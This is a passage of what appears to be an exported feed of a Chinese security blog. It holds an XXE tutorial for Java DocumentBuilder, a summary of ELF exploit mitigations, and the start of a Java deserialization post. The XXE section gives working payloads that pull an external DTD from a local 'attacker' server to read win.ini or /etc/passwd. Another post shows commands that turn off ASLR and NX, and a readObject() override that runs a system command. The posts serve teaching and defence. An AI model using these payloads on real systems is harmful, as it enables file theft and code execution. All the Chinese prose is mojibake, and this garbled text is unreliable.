id="4ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æå¤–éƒ¨å®ä½“ï¼š"><a href="#4ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æå¤–éƒ¨å®ä½“ï¼š" class="headerlink" title="4ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æå¤–éƒ¨å®ä½“ï¼š"></a>4ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æå¤–éƒ¨å®ä½“ï¼š</h3><p>ä¿®æ”¹test.xmlå†…å®¹å¦‚ä¸‹ï¼Œä¸»è¦ä¿®æ”¹ä¸ºSYSTEMæ‰§è¡Œè®¿é—®å¤–éƒ¨é“¾æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://127.0.0.1/Mi1k7ea.dtd&quot;&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;&amp;tea;&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>åœ¨æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¿™é‡Œè‡ªå·±å¼€å¯ä¸€ä¸ªWebæœåŠ¡ï¼‰çš„Webç›®å½•æ”¾ç½®ä¸€ä¸ªMi1k7ea.dtdæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå…¶ä¸­e:/secret.iniä¸ºæœ¬åœ°çš„ä¸€ä¸ªæ•æ„Ÿæ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY tea SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br></pre></td></tr></table></figure><p>å½“ç„¶åœ¨Linuxç³»ç»Ÿå¯ä»¥å°†åŒå¼•å·å†…çš„å†…å®¹æ”¹ä¸ºâ€file:///etc/passwdâ€æ¥è¯»å–passwdæ–‡ä»¶å†…å®¹ã€‚</p><p>è¿è¡Œä»£ç ï¼Œå‘ç°æˆåŠŸé€šè¿‡è¿œç¨‹åŠ è½½è§£æDTDæ–‡ä»¶è¯»å–äº†æœ¬åœ°æ–‡ä»¶å†…å®¹ï¼š</p><p><img src="/2019/02/13/XMLæ³¨å…¥ä¹‹DocumentBuilder/3.png" alt="demo"></p><p>å½“ç„¶ï¼Œå¤–éƒ¨å®ä½“è¿˜æœ‰å¦ä¸€ç§å†™æ³•ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY % milk SYSTEM &quot;http://127.0.0.1/Mi1k7ea.dtd&quot;&gt;</span><br><span class="line">        %milk;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;&amp;tea;&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå’Œä¸Šé¢æ˜¯ä¸€æ ·çš„ã€‚</p><h2 id="è¿›ä¸€æ­¥åˆ©ç”¨"><a href="#è¿›ä¸€æ­¥åˆ©ç”¨" class="headerlink" title="è¿›ä¸€æ­¥åˆ©ç”¨"></a>è¿›ä¸€æ­¥åˆ©ç”¨</h2><p>â€¦</p><h2 id="æ£€æµ‹æ–¹æ³•"><a href="#æ£€æµ‹æ–¹æ³•" class="headerlink" title="æ£€æµ‹æ–¹æ³•"></a>æ£€æµ‹æ–¹æ³•</h2><p>1ã€åœ¨Javaé¡¹ç›®ä¸­æœç´¢javax.xml.parsersä¸‹çš„DocumentBuilderFactoryå’ŒDocumentBuilderï¼Œæ’æŸ¥æ˜¯å¦ä½¿ç”¨äº†è¯¥APIè§£æXMLæ–‡æ¡£å†…å®¹ï¼›</p><p>2ã€è‹¥ä½¿ç”¨äº†ï¼Œåˆ™è¿›ä¸€æ­¥æ’æŸ¥æ˜¯å¦ç¦ç”¨äº†ä¸å®‰å…¨çš„æ“ä½œï¼Œå…·ä½“çš„æ˜¯çœ‹setFeature()çš„è®¾ç½®æ˜¯å¦å­˜åœ¨ç»•è¿‡çš„å¯èƒ½ã€‚</p><h2 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h2><p>æ­£ç¡®åœ°è®¾ç½®setFeature()æ¥è¿›è¡Œé˜²å¾¡ï¼š</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ä½•ä¸ºDocumentBuilder&quot;&gt;&lt;a href=&quot;#ä½•ä¸ºDocumentBuilder&quot; class=&quot;headerlink&quot; title=&quot;ä½•ä¸ºDocumentBuilder&quot;&gt;&lt;/a&gt;ä½•ä¸ºDocumentBuilder&lt;/h2&gt;&lt;p&gt;DocumentBu
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>ELFå®‰å…¨é˜²å¾¡æœºåˆ¶å°ç»“</title>
    <link href="https://Mi1k7ea.github.com/2019/02/09/ELF%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E5%B0%8F%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/02/09/ELFå®‰å…¨é˜²å¾¡æœºåˆ¶å°ç»“/</id>
    <published>2019-02-09T03:30:47.000Z</published>
    <updated>2019-02-09T05:24:22.866Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œä¸»è¦ä»‹ç»ä¸€ä¸‹Linuxä¸‹ELFæ–‡ä»¶çš„ä¸€äº›å®‰å…¨é˜²å¾¡æœºåˆ¶åŠå…¶åŸç†ï¼Œå…¶åœ¨äºŒè¿›åˆ¶å®‰å…¨å’ŒPwnä¸Šç»å¸¸ä¼šç¢°åˆ°ï¼Œè‡³äºå„ä¸ªç±»å‹çš„ç»•è¿‡æŠ€å·§åé¢ä¼šè¡¥å……ã€‚</p><h2 id="NXï¼ˆDEPï¼‰"><a href="#NXï¼ˆDEPï¼‰" class="headerlink" title="NXï¼ˆDEPï¼‰"></a>NXï¼ˆDEPï¼‰</h2><p>NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆå³Windowsä¸Šç±»ä¼¼çš„DEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><p>é€šå¸¸å¼€å¯äº†NXåï¼Œå³ä½¿æœ‰æ ˆæº¢å‡ºæ¼æ´ä¹Ÿæ‰§è¡Œä¸äº†å†™åœ¨æ ˆä¸Šçš„shellcodeï¼Œä½†æ˜¯å¯é€šè¿‡ROPæ–¹å¼æ¥ç»•è¿‡NXè·³è½¬è‡³å…¶ä»–åœ°æ–¹æ‰§è¡Œã€‚</p><p>gccç¼–è¯‘å™¨é»˜è®¤å¼€å¯äº†NXé€‰é¡¹ï¼Œå¦‚æœéœ€è¦å…³é—­NXé€‰é¡¹ï¼Œå¯ä»¥ç»™gccç¼–è¯‘å™¨æ·»åŠ -z execstackå‚æ•°ã€‚ä¾‹å¦‚ï¼šgcc -z execstack -o test test.c</p><p>åœ¨Windowsä¸‹ï¼Œç±»ä¼¼çš„æ¦‚å¿µä¸ºDEPï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰ï¼Œåœ¨æœ€æ–°ç‰ˆçš„Visual Studioä¸­é»˜è®¤å¼€å¯äº†DEPç¼–è¯‘é€‰é¡¹ã€‚</p><p>ç½‘ä¸Šæ‰¾çš„ç¤ºä¾‹å›¾ï¼š</p><p><img src="/2019/02/09/ELFå®‰å…¨é˜²å¾¡æœºåˆ¶å°ç»“/1.jpg" alt="NX"></p><h2 id="PIEï¼ˆASLRï¼‰"><a href="#PIEï¼ˆASLRï¼‰" class="headerlink" title="PIEï¼ˆASLRï¼‰"></a>PIEï¼ˆASLRï¼‰</h2><p>PIEï¼ˆPosition-Independent Executablesï¼‰ä½ç½®æ— å…³çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå’ŒWindowsä¸‹çš„ASLRï¼ˆAddress Space Layout Randomization)æœºåˆ¶ç±»ä¼¼ï¼ŒPIE enabledè¡¨ç¤ºç¨‹åºå¼€å¯åœ°å€éšæœºåŒ–é€‰ã€æ„å‘³ç€ç¨‹åºæ¯æ¬¡è¿è¡Œçš„æ—¶å€™åœ°å€éƒ½ä¼šå˜åŒ–ï¼Œè€Œå¦‚æœæ²¡æœ‰å¼€PIEçš„è¯é‚£ä¹ˆNo PIE (0x400000)ï¼Œæ‹¬å·å†…çš„æ•°æ®å°±æ˜¯ç¨‹åºçš„åŸºåœ°å€ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆDEPï¼‰å’ŒPIEï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚</p><p>PIEæœºåˆ¶æœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š</p><p>â€‹         0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚</p><p>â€‹         1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚</p><p>â€‹         2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚</p><p>å¯ä»¥é˜²èŒƒåŸºäºRet2libcæ–¹å¼çš„é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚</p><p>Built as PIEï¼šä½ç½®ç‹¬ç«‹çš„å¯æ‰§è¡ŒåŒºåŸŸPIEã€‚è¿™æ ·ä½¿å¾—åœ¨åˆ©ç”¨ç¼“å†²æº¢å‡ºå’Œç§»åŠ¨æ“ä½œç³»ç»Ÿä¸­å­˜åœ¨çš„å…¶ä»–å†…å­˜å´©æºƒç¼ºé™·æ—¶é‡‡ç”¨é¢å‘è¿”å›çš„ç¼–ç¨‹ROPï¼ˆreturn-oriented programmingï¼‰æ–¹æ³•å˜å¾—éš¾å¾—å¤šã€‚</p><p>liunxä¸‹å…³é—­PIEçš„å‘½ä»¤å¦‚ä¸‹ï¼šsudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</p><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELROï¼ˆRelocation Read Onlyï¼‰é‡å®šå‘åªè¯»ï¼Œå®ç°å°±æ˜¯ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯»ã€‚é€šè¿‡è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä¿æŠ¤åº“å‡½æ•°çš„è°ƒç”¨ä¸å—æ”»å‡»è€…é‡å®šä½çš„å½±å“ï¼Œä»è€Œå‡å°‘å¯¹GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚</p><p>RELROæœ‰Partial RELROå’ŒFULL RELROä¸¤ä¸ªé€‰é¡¹ï¼Œå¦‚æœå¼€å¯FULL RELROï¼Œæ„å‘³ç€æ— æ³•ä¿®æ”¹GOTè¡¨ï¼›å¦‚æœä¸ºPartial RELROï¼Œè¯´æ˜å¯¹GOTè¡¨å…·æœ‰å†™æƒé™ã€‚</p><p>å¯é€šè¿‡ROPç»•è¿‡ã€‚</p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>Fortify æŠ€æœ¯æ˜¯GCCåœ¨ç¼–è¯‘æºç æ—¶åˆ¤æ–­ç¨‹åºçš„å“ªäº›bufferä¼šå­˜åœ¨å¯èƒ½çš„æº¢å‡ºï¼Œåœ¨bufferå¤§å°å·²çŸ¥çš„æƒ…å†µä¸‹ï¼ŒGCCä¼šæŠŠ strcpyã€memcpy,ã€memsetç­‰å‡½æ•°è‡ªåŠ¨æ›¿æ¢æˆç›¸åº”çš„ __strcpy_chk(dst, src, dstlen)ç­‰å‡½æ•°ï¼Œè¾¾åˆ°é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„ä½œç”¨ã€‚</p><p>FORTIFY_SOURCEæœºåˆ¶å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æœ‰ä¸¤ä¸ªé™åˆ¶ï¼š</p><p>â€‹    (1)åŒ…å«%nçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸èƒ½ä½äºç¨‹åºå†…å­˜ä¸­çš„å¯å†™åœ°å€ï¼›</p><p>â€‹    (2)å½“ä½¿ç”¨ä½ç½®å‚æ•°æ—¶ï¼Œå¿…é¡»ä½¿ç”¨èŒƒå›´å†…çš„æ‰€æœ‰å‚æ•°ã€‚ä¾‹å¦‚è¦ä½¿ç”¨%4$xï¼Œåˆ™å¿…é¡»åŒæ—¶ä½¿ç”¨1ã€2ã€3ã€‚</p><p>GCCä¸­-D_FORTIFY_SOURCE=2æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä½†æ˜¯åªæœ‰å¼€å¯O2æˆ–ä»¥ä¸Šä¼˜åŒ–çš„æ—¶å€™ï¼Œè¿™ä¸ªé€‰é¡¹æ‰ä¼šè¢«çœŸæ­£æ¿€æ´»ã€‚</p><p>å¦‚æœæŒ‡å®š-D_FORTIFY_SOURCE=1ï¼Œé‚£åŒæ ·ä¹Ÿè¦å¼€å¯O1æˆ–ä»¥ä¸Šä¼˜åŒ–ï¼Œè¿™ä¸ªé€‰é¡¹æ‰ä¼šè¢«çœŸæ­£æ¿€æ´»ã€‚</p><p>å¯ä»¥ä½¿ç”¨-U_FORTIFY_SOURCEæˆ–è€…-D_FORTIFY_SOURCE=0æ¥ç¦ç”¨ã€‚</p><p>å¦‚æœå¼€å¯äº†-D_FORTIFY_SOURCE=2ï¼Œé‚£ä¹ˆè°ƒç”¨__printf_chkå‡½æ•°çš„æ—¶å€™ä¼šæ£€æŸ¥format stringä¸­æ˜¯å¦å­˜åœ¨%nï¼Œå¦‚æœå­˜åœ¨%n è€Œä¸”format stringæ˜¯åœ¨ä¸€ä¸ªå¯å†™çš„segmentä¸­çš„ï¼ˆä¸æ˜¯åœ¨read-onlyå†…å­˜æ®µä¸­ï¼‰ï¼Œé‚£ä¹ˆç¨‹åºä¼šæŠ¥é”™å¹¶ç»ˆæ­¢ã€‚å¦‚æœæ˜¯å¼€å¯-D_FORTIFY_SOURCE=1ï¼Œé‚£ä¹ˆå°±ä¸ä¼šæŠ¥é”™ã€‚</p><h2 id="CANARYï¼ˆStackï¼‰"><a href="#CANARYï¼ˆStackï¼‰" class="headerlink" title="CANARYï¼ˆStackï¼‰"></a>CANARYï¼ˆStackï¼‰</h2><p>Stackï¼Œæ ˆæº¢å‡ºæ£€æŸ¥ï¼Œç”¨Canaryæ˜¯å¦å˜åŒ–æ¥æ£€æµ‹ï¼Œå…¶ä¸­Canary foundè¡¨ç¤ºå¼€å¯ã€‚</p><p>Canaryæ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼šå¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxå°†cookieä¿¡æ¯ç§°ä¸ºCanaryã€‚</p><p>å¦‚æœæ ˆä¸­å¼€å¯Canary foundï¼Œé‚£ä¹ˆå°±ä¸èƒ½ç”¨ç›´æ¥ç”¨æº¢å‡ºçš„æ–¹æ³•è¦†ç›–æ ˆä¸­è¿”å›åœ°å€ï¼Œè€Œä¸”è¦é€šè¿‡æ”¹å†™æŒ‡é’ˆä¸å±€éƒ¨å˜é‡ã€leak canaryã€overwrite canaryçš„æ–¹æ³•æ¥ç»•è¿‡ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">PwnåŸºç¡€çŸ¥è¯†ç¬”è®°</a></p><p><a href="https://blog.csdn.net/axiejundong/article/details/73065023?utm_source=blogxgwz8" target="_blank" rel="noopener">è½¯ä»¶å¸¸ç”¨å®‰å…¨é˜²æŠ¤æ‰‹æ®µ checksec æ€»ç»“</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è¿™é‡Œä¸»è¦ä»‹ç»ä¸€ä¸‹Linuxä¸‹ELFæ–‡ä»¶çš„ä¸€äº›å®‰å…¨é˜²å¾¡æœºåˆ¶åŠå…¶åŸç†ï¼Œå…¶åœ¨äºŒè¿›åˆ¶å®‰å…¨å’ŒPwnä¸Šç»å¸¸ä¼šç¢°åˆ°ï¼Œè‡³äºå„ä¸ªç±»å‹çš„ç»•è¿‡æŠ€å·§åé¢ä¼šè¡¥å……ã€‚&lt;/p&gt;
&lt;h2 id=&quot;NXï¼ˆDEPï¼‰&quot;&gt;&lt;a href=&quot;#NXï¼ˆDEPï¼‰&quot; class=&quot;headerlink&quot; title=&quot;NX
      
    
    </summary>
    
      <category term="äºŒè¿›åˆ¶åŸºç¡€" scheme="https://Mi1k7ea.github.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="äºŒè¿›åˆ¶" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Javaååºåˆ—åŒ–æ¼æ´</title>
    <link href="https://Mi1k7ea.github.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://Mi1k7ea.github.com/2019/02/06/Javaååºåˆ—åŒ–æ¼æ´/</id>
    <published>2019-02-06T04:14:03.000Z</published>
    <updated>2019-02-13T14:12:11.528Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨å­¦ä¹ Javaååºåˆ—åŒ–æ¼æ´ä¹‹å‰ï¼Œå»ºè®®å…ˆç†Ÿæ‚‰<a href="https://mi1k7ea.github.io/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶</a>ã€‚</p><p>åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­ï¼ŒJavaç±»ååºåˆ—åŒ–æ¼æ´è¾ƒPHPå’ŒPythonçš„ç›¸æ¯”ï¼Œæ˜¾å¾—ç¨å¾®å¤æ‚ä¸€äº›ã€‚ä¸»è¦æ˜¯è¦æ±‚å¯¹Javaè¾ƒä¸ºç†Ÿæ‚‰ã€‚ä¸‹é¢å°ç»“ä¸€ä¸‹Javaååºåˆ—åŒ–æ¼æ´çš„ç›¸å…³å†…å®¹ã€‚</p><h2 id="ä½•ä¸ºJavaååºåˆ—åŒ–æ¼æ´"><a href="#ä½•ä¸ºJavaååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ä½•ä¸ºJavaååºåˆ—åŒ–æ¼æ´"></a>ä½•ä¸ºJavaååºåˆ—åŒ–æ¼æ´</h2><p>å½“å¼€å‘è€…è‡ªå®šä¹‰å®ç°Serializableã€æ·»åŠ è‡ªå·±çš„readObject()æ–¹æ³•æ—¶ï¼Œè‹¥readObject()æ–¹æ³•å†…ä»£ç é€»è¾‘å­˜åœ¨ç¼ºé™·ï¼Œåˆ™å¯èƒ½å­˜åœ¨Javaååºåˆ—åŒ–æ¼æ´çš„é£é™©ã€‚å¦‚æœæ­¤æ—¶JavaæœåŠ¡çš„ååºåˆ—åŒ–APIå…è®¸å¤–éƒ¨ç”¨æˆ·ä½¿ç”¨ï¼Œåˆ™ä¼šå¯¼è‡´æ”»å‡»è€…ä½¿ç”¨ç²¾å¿ƒæ„é€ çš„payloadæ¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚</p><p>Javaååºåˆ—åŒ–ä¸­readObject()æ–¹æ³•çš„ä½œç”¨ç›¸å½“äºPHPååºåˆ—åŒ–ä¸­çš„é­”æœ¯å‡½æ•°ï¼Œä½¿ååºåˆ—åŒ–è¿‡ç¨‹åœ¨ä¸€å®šç¨‹åº¦ä¸Šå—æ§æˆä¸ºå¯èƒ½ï¼Œæ˜¯å¦çœŸçš„å¯æ§ï¼Œè¿˜éœ€åˆ†ææ¯ä¸ªå¯¹è±¡çš„readObject()æ–¹æ³•å…·ä½“æ˜¯å¦‚ä½•å®ç°çš„ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œåœ¨Javaçš„readObject()æ–¹æ³•ä¸­å¾ˆå°‘ä¼šåƒCTFä¸­PHPçš„ååºåˆ—åŒ–æ¼æ´é¢˜ç›®ä¸€æ ·ç›´æ¥å°†æ¼æ´ä»£ç å†™åœ¨è¯¥æ–¹æ³•ä¸­ï¼Œè¿™æ—¶å°±éœ€è¦å»æ„é€ åå°„é“¾æ¥è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚</p><h2 id="é‡å†™readObject-ç¤ºä¾‹"><a href="#é‡å†™readObject-ç¤ºä¾‹" class="headerlink" title="é‡å†™readObject()ç¤ºä¾‹"></a>é‡å†™readObject()ç¤ºä¾‹</h2><p>Javaååºåˆ—åŒ–æ¼æ´çš„æ ¹æºåœ¨äºé‡å†™readObject()æ–¹æ³•å¯¼è‡´å­˜åœ¨æ¼æ´ä»£ç ã€‚</p><p>readObject()æ–¹æ³•é‡å†™çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼ŒreadObject()æ–¹æ³•è¢«å®šä¹‰æˆäº†privateï¼Œå¹¶ä¸”æ˜¯å¿…é¡»å°è¯•æ•è·IOExceptionå’ŒClassNotFoundExceptionçš„å¼‚å¸¸ã€‚</p><p>è¿™é‡Œå†è´´å¦å¤–ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œåˆ›å»ºä¸€ä¸ªä¸å®‰å…¨çš„ç±»å¯¹è±¡ï¼Œèµ‹å€¼å…¶nameå±æ€§å¹¶åºåˆ—åŒ–ä¸ºæ–‡ä»¶ä¿å­˜èµ·æ¥ï¼Œæ¥ç€é€šè¿‡ååºåˆ—åŒ–è¯¥æ–‡ä»¶è·å–è¯¥å¯¹è±¡åŠå…¶å±æ€§å€¼ï¼Œé€šè¿‡é‡å†™readObject()æ–¹æ³•åœ¨è°ƒç”¨é»˜è®¤çš„readObject()æ–¹æ³•ä¹‹åæ·»åŠ ä¸€æ¡æ‰§è¡Œè®¡ç®—å™¨çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        UnsafeClass Unsafe = <span class="keyword">new</span> UnsafeClass();</span><br><span class="line">        Unsafe.name = <span class="string">"Mi1k7ea"</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"[*]åºåˆ—åŒ–å¯¹è±¡"</span>);</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(Unsafe);</span><br><span class="line">        os.close();</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"[*]ååºåˆ—åŒ–æ–‡ä»¶ä¸­ä¿å­˜çš„åºåˆ—åŒ–å¯¹è±¡"</span>);</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsafeClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//é‡å†™readObject()æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³•</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span 